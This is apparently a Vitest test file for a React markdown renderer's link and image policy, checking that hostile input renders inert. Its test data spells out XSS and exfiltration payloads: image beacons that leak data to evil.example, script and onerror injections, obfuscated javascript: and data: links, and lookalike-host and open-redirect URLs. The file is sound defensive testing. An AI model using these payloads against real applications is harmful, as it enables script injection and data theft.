import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import Markdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { SafeMarkdown } from "@/components/exec/SafeMarkdown";
import {
  SAFE_MARKDOWN_DISALLOWED,
  SAFE_MARKDOWN_LINK_REL,
  SAFE_MARKDOWN_OPTIONS,
  safeLink,
  safeUrlTransform
} from "@/lib/exec/safe-markdown";

// Characters built from their codes so no tool or editor can rewrite them.
const BS = String.fromCharCode(92);
const TAB = String.fromCharCode(9);
const LF = String.fromCharCode(10);

/** The policy alone, on react-markdown with remark-gfm: what the guarantees rest on. */
const policyHtml = (md: string) =>
  renderToStaticMarkup(createElement(Markdown, { ...SAFE_MARKDOWN_OPTIONS, remarkPlugins: [remarkGfm], children: md }));
/** The styled component the UI uses. */
const componentHtml = (md: string) => renderToStaticMarkup(createElement(SafeMarkdown, { content: md }));

const hrefs = (html: string) => [...html.matchAll(/href="([^"]*)"/g)].map((m) => m[1]);
// React escapes every "<" in text, so each "<letter…>" in the output is a real
// tag. Checking tags (not the whole string) keeps inert visible text such as
// "onerror=alert(1)" from counting as markup.
const tagsOf = (html: string) => html.match(/<[a-zA-Z][^>]*>/g) ?? [];

beforeEach(() => {
  // appOrigin() falls back to the canonical host when this is blank.
  vi.stubEnv("NEXT_PUBLIC_APP_URL", "");
});

afterEach(() => {
  vi.unstubAllEnvs();
});

// Each of these must come out with no image, no link target, no script and
// no other URL-carrying attribute, from the policy and from the component.
const HOSTILE: ReadonlyArray<readonly [string, string]> = [
  ["markdown image (a beacon with data in its URL)", "![x](https://evil.example/p.png?d=secret)"],
  ["reference-style image", `![x][pic]${LF}${LF}[pic]: https://evil.example/p.png`],
  ["image of an allowlisted host", "![x](https://operations.scaledai.org/logo.png)"],
  ["raw <img>", '<img src="https://evil.example/p.png?d=secret">'],
  ["raw <img> inside prose, with a handler", "Hello <img src=https://evil.example/p.png onerror=alert(1)> there"],
  ["raw <script>", "<script>alert(document.cookie)</script>"],
  ["raw <a href>", '<a href="https://evil.example">x</a>'],
  ["raw <iframe>", '<iframe src="https://evil.example/frame"></iframe>'],
  ["javascript: link", "[a](javascript:alert(1))"],
  ["javascript: link, mixed case", "[a](JaVaScRiPt:alert(1))"],
  ["javascript: link, entity-encoded colon", "[a](javascript&#58;alert(1))"],
  ["data: link", "[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)"],
  ["off-allowlist https link", "[a](https://evil.com/login)"],
  ["lookalike of the DD host", "[a](https://operations.scaledai.org.evil.com/x)"],
  ["http: to the DD host", "[a](http://operations.scaledai.org/tasks/1)"],
  ["mailto: link", "[mail](mailto:ceo@scaledai.org?subject=hi&body=secret)"],
  ["mailto: autolink", "<mailto:ceo@scaledai.org>"],
  ["bare email address (GFM autolinks it as mailto:)", "write to ceo@scaledai.org today"],
  ["angle-bracket autolink to another host", "<https://evil.example/x>"],
  ["www. literal (GFM autolinks it as http:)", "see www.evil.example now"],
  ["protocol-relative link", "[a](//evil.example/x)"],
  ["dot segments that collapse to //", "[a](/..//evil.example/x)"],
  ["Slack OAuth consent screen", "[a](https://slack.com/oauth/v2/authorize?client_id=1&scope=chat:write)"],
  ["Slack Web API call", "[a](https://slack.com/api/chat.postMessage?token=x&channel=C1&text=hi)"],
  ["Outlook compose deep link", "[a](https://outlook.office.com/mail/deeplink/compose?to=x@evil.example&body=secret)"],
  ["fragment-only link", "[a](#top)"],
  ["relative link without a leading slash", "[a](tasks/1)"]
];

describe("SafeMarkdown policy: hostile input", () => {
  for (const [name, md] of HOSTILE) {
    it(`renders ${name} with no image, link target or script`, () => {
      for (const html of [policyHtml(md), componentHtml(md)]) {
        const tags = tagsOf(html);
        expect(tags.filter((t) => /^<(img|script|iframe|input|object|embed|video|audio|source)\b/i.test(t))).toEqual([]);
        expect(tags.filter((t) => /\s(href|src|srcset|action|formaction|poster|data|on[a-z]+)=/i.test(t))).toEqual([]);
      }
    });
  }

  it("shows unparseable raw HTML as escaped text, never as an element", () => {
    const html = componentHtml("Hello <img src=https://evil.example/p.png onerror=alert(1)> there");
    expect(html).toContain("&lt;img");
    expect(tagsOf(html).some((t) => /^<img/i.test(t))).toBe(false);
  });

  it("keeps a backslash path on DD (remark percent-encodes it before the policy sees it)", () => {
    for (const html of [policyHtml(`[a](/${BS}evil.example)`), componentHtml(`[a](/${BS}evil.example)`)]) {
      expect(hrefs(html)).toEqual(["/%5Cevil.example"]);
    }
  });

  it("keeps the words of a refused link as plain text", () => {
    const html = componentHtml("Please [verify your account](https://evil.com/login) today.");
    expect(html).toContain("verify your account");
    expect(html).toContain("<span>verify your account</span>");
    expect(html).not.toContain("evil.com");
  });

  it("drops raw HTML rather than showing it as markup", () => {
    const html = componentHtml("before <b>bold?</b> <img src=x> after");
    expect(html).not.toContain("&lt;b&gt;");
    expect(html).not.toContain("&lt;img");
    expect(html).toContain("bold?");
    expect(html).toContain("after");
  });

  it("escapes text that looks like markup", () => {
    expect(componentHtml("a < b && c > d")).toContain("a &lt; b &amp;&amp; c &gt; d");
  });

  it("removes GFM task-list checkboxes and footnote markup but keeps their text", () => {
    const tasks = policyHtml("- [x] shipped it");
    expect(tasks).not.toMatch(/<input/i);
    expect(tasks).toContain("shipped it");

    const footnote = policyHtml(`A claim[^1].${LF}${LF}[^1]: The source.`);
    expect(footnote).not.toMatch(/<sup|<section/i);
    expect(footnote).not.toMatch(/\shref=/);
    expect(footnote).toContain("The source.");
  });
});

describe("SafeMarkdown policy: allowed links survive", () => {
  it("keeps a DD link, as a path on the app's own host, opened in place", () => {
    const html = componentHtml("[Task 42](https://operations.scaledai.org/tasks/42?tab=comments#c1)");
    expect(hrefs(html)).toEqual(["/tasks/42?tab=comments#c1"]);
    expect(html).not.toContain('target="_blank"');
    expect(html).toContain(`rel="${SAFE_MARKDOWN_LINK_REL}"`);
  });

  it("keeps a DD-relative path", () => {
    expect(hrefs(componentHtml("[Clients](/clients/c_9)"))).toEqual(["/clients/c_9"]);
  });

  it("keeps an Outlook webLink and a Slack permalink, in a new tab, with noopener noreferrer nofollow", () => {
    const outlook = "https://outlook.office.com/owa/?ItemID=AAMkAGI2TG93AAA%3D&exvsurl=1&viewmodel=ReadMessageItem";
    const slack = "https://scaledai.slack.com/archives/C024BE91L/p1699999999000100?thread_ts=1699999999.000100&cid=C024BE91L";
    const html = componentHtml(`[email](${outlook}) and [thread](${slack})`);
    expect(hrefs(html).map((h) => h.replace(/&amp;/g, "&"))).toEqual([outlook, slack]);
    expect(html.match(/target="_blank"/g)).toHaveLength(2);
    expect(html.match(/rel="noopener noreferrer nofollow"/g)).toHaveLength(2);
  });

  it("keeps an autolinked allowlisted URL", () => {
    expect(hrefs(policyHtml("<https://scaledai.slack.com/archives/C1/p1700000000000100>"))).toEqual([
      "https://scaledai.slack.com/archives/C1/p1700000000000100"
    ]);
  });

  it("never writes a DD URL whose path collapses to // as a path", () => {
    const html = componentHtml("[a](https://operations.scaledai.org//evil.example/x)");
    expect(hrefs(html)).toEqual(["https://operations.scaledai.org//evil.example/x"]);
    expect(html).not.toContain('href="//');
  });
});

describe("SafeMarkdown rendering", () => {
  it("renders prose, lists, code, tables and strikethrough with the house styling", () => {
    const md = [
      "# Heading",
      "Some **bold** and *em* and `inline` and ~~gone~~.",
      "",
      "1. one",
      "2. two",
      "",
      "```",
      "block code",
      "```",
      "",
      "| a | b |",
      "|---|--:|",
      "| 1 | 2 |"
    ].join(LF);
    const html = componentHtml(md);
    expect(html).toContain("<h3");
    expect(html).not.toContain("<h1");
    expect(html).toContain("<strong");
    expect(html).toContain("<em");
    expect(html).toContain("<del");
    expect(html).toContain("<ol");
    expect(html).toContain("<pre");
    expect(html).toContain("block code");
    expect(html).toContain("<table");
    expect(html).toContain("text-align:right");
  });

  it("never passes react-markdown's node prop through to the DOM", () => {
    const html = componentHtml("# t\n\n[a](/tasks/1) `c` | x |\n|---|\n| y |");
    expect(html).not.toMatch(/\snode=/);
  });

  it("renders non-string content as nothing instead of throwing", () => {
    expect(() => renderToStaticMarkup(createElement(SafeMarkdown, { content: undefined as unknown as string }))).not.toThrow();
  });
});

describe("safeLink / safeUrlTransform", () => {
  it("drops every URL attribute except href", () => {
    expect(safeUrlTransform("https://operations.scaledai.org/x.png", "src", {} as never)).toBeUndefined();
    expect(safeUrlTransform("https://operations.scaledai.org/x", "cite", {} as never)).toBeUndefined();
    expect(safeUrlTransform("https://operations.scaledai.org/x", "href", {} as never)).toBe("/x");
  });

  it("refuses empty, oversized and non-string input", () => {
    expect(safeLink(null)).toBeNull();
    expect(safeLink(undefined)).toBeNull();
    expect(safeLink("")).toBeNull();
    expect(safeLink(`/${"a".repeat(5_000)}`)).toBeNull();
  });

  it("refuses paths with characters a URL parser rewrites", () => {
    expect(safeLink(`/${TAB}/evil.example`)).toBeNull();
    expect(safeLink(`/x${LF}`)).toBeNull();
    expect(safeLink(`/${BS}evil.example`)).toBeNull();
    expect(safeLink("/a b")).toBeNull();
    expect(safeLink(" /tasks/1")).toBeNull();
    // An encoded backslash or slash is just a character in the path.
    expect(safeLink("/%5Cevil.example")).toEqual({ href: "/%5Cevil.example", external: false });
    expect(safeLink("/%2F/evil.example")).toEqual({ href: "/%2F/evil.example", external: false });
  });

  it("refuses dot segments that collapse to //, and keeps ones that stay on DD", () => {
    expect(safeLink("/..//evil.example")).toBeNull();
    expect(safeLink("/.//evil.example")).toBeNull();
    expect(safeLink("/tasks/../clients")).toEqual({ href: "/clients", external: false });
    expect(safeLink("/?next=//evil.example")).toEqual({ href: "/?next=//evil.example", external: false });
  });

  it("makes links to the configured origin relative and leaves the other DD host absolute", () => {
    vi.stubEnv("NEXT_PUBLIC_APP_URL", "https://delegationdoer-production.up.railway.app/");
    expect(safeLink("https://delegationdoer-production.up.railway.app/tasks/1")).toEqual({ href: "/tasks/1", external: false });
    expect(safeLink("https://operations.scaledai.org/tasks/1")).toEqual({
      href: "https://operations.scaledai.org/tasks/1",
      external: true
    });
  });

  it("keeps allowlisted links absolute when NEXT_PUBLIC_APP_URL is malformed", () => {
    vi.stubEnv("NEXT_PUBLIC_APP_URL", "not a url");
    expect(safeLink("https://operations.scaledai.org/tasks/1")).toEqual({
      href: "https://operations.scaledai.org/tasks/1",
      external: true
    });
  });

  it("is idempotent on its own output", () => {
    for (const raw of [
      "/tasks/1?x=1#y",
      "https://operations.scaledai.org/tasks/1",
      "https://scaledai.slack.com/archives/C1/p1700000000000100",
      "https://operations.scaledai.org//evil.example/x"
    ]) {
      const once = safeLink(raw);
      expect(once).not.toBeNull();
      expect(safeLink(once!.href)).toEqual(once);
    }
  });

  it("ships the policy the contract names", () => {
    expect(SAFE_MARKDOWN_OPTIONS.skipHtml).toBe(true);
    expect(SAFE_MARKDOWN_OPTIONS.unwrapDisallowed).toBe(true);
    expect(SAFE_MARKDOWN_DISALLOWED).toContain("img");
    expect(SAFE_MARKDOWN_OPTIONS.disallowedElements).toBe(SAFE_MARKDOWN_DISALLOWED);
    expect(SAFE_MARKDOWN_LINK_REL).toBe("noopener noreferrer nofollow");
  });
});
